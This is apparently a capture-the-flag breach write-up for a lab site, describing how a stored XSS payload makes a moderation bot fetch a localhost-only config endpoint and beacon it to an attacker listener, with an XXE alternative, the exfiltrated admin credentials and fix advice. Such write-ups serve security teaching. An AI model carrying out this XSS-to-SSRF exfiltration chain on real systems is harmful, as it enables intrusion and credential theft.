# Breach: stored-xss-bot-ssrf (Gate 3: staff → god — chained stored XSS → SSRF proxy)

**Severity:** Critical
**Yields a flag:** Yes — `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

## Explanation

Chaining the stored XSS (breach
[`stored-xss-cookie-theft-flag`](../07-stored-xss-cookie-theft-flag/)) with a
*fetch-and-relay* payload turns the server-side moderation bot into an
**SSRF proxy**. The bot's browser originates from `127.0.0.1` and — unlike a
direct request — is allowed to read `/internal/config`, which is gated as
"localhost only".

Direct `curl http://localhost:4942/internal/config` from the same host still
returns `403 {"error":"forbidden"}` (tested anonymous, with cadet/staff/god
sessions, with the bot's stolen moderator JWT + `flag` cookie, with
HeadlessChrome UA, with `Sec-Fetch-*`/`Origin`/`Referer` header sets, with
`Host: 127.0.0.1:4942`, and with `x-42-internal` variants) — the exact gate
mechanism was **not** identified, but the bot's same-origin fetch passes it.
That the config is exposed at all is stated by the site's own deploy log:

> *NOTE: /internal/config restricted to localhost only. do not expose.*

### Alternative path (pure XXE, without the bot)

The `/agenda` XML importer uses stdlib `xml.etree` with no server-side
validation (per the site's own comments: *"the importer parses any XML you
upload, entities and all"*, *"the XML agenda import endpoint is not validated
server-side"*). An external-entity payload can make the *server itself* fetch
`/internal/config` from its own loopback vantage point — the same SSRF
primitive without needing the bot.

## Exploitation script

See `ssrf-relay.sh` in this folder:

```bash
./ssrf-relay.sh http://localhost:4942 cookies_jdoe.txt 10.0.2.2:8888
```

> The listener must be reachable from the bot's vantage — see the Environment
> note in [`../walkthrough.md`](../walkthrough.md). Current setup: the bot
> runs inside a VirtualBox NAT VM and the operator on the host, so
> `10.0.2.2:8888` is the address to pass; `127.0.0.1` only works if the bot
> and the operator share a network namespace.

Prerequisite: `cookies_jdoe.txt` is the jdoe student session created by the
login step in `../05-password-reset-token-disclosure/`.

0. Start the listener first:
   `python3 ../07-stored-xss-cookie-theft-flag/xss-listener.py &` — it binds
   `0.0.0.0:8888` and logs to `hits.log`; the exfil arrives URL-encoded in
   `hits.log`.
1. Posts an `<img onerror>` payload (JS `eval(String.fromCharCode(...))`
   encoded to stay quote-safe in the attribute — the bot does **not**
   execute `<script>` elements) to the thread the bot watches
   (`/forum/bbeo32ucx0a65b8`).
2. The payload makes the bot `fetch('/internal/config')` and beacon the
   response body back to the listener.
3. Listener decodes the exfiltrated config JSON:

```json
{
  "jwt_secret": "42network",
  "pb_admin_email": "admin@42network.local",
  "pb_admin_password": "Darkly42Admin!",
  "app_version": "1.0.0",
  "campus": "wilcity",
  "darkly_flag": "FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"
}
```

## Impact

- Walkthrough flag 3 disclosed (`FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`).
- **PocketBase superuser credentials** disclosed → total backend takeover
  (see `../04-pocketbase-superuser-takeover-flag-god` — the breach that
  completes the god transition).

## Fix recommendation

- Serve internal config only to trusted *server-side* identities (mTLS,
  unix socket, PB service account) — never to browser-origin requests.
- Sanitize forum HTML (see
  [`stored-xss-cookie-theft-flag`](../07-stored-xss-cookie-theft-flag/)) —
  this chain depends on it.
- Replace `xml.etree` with `defusedxml` (ticket already filed internally).
- Rotate `jwt_secret` and PB admin credentials.
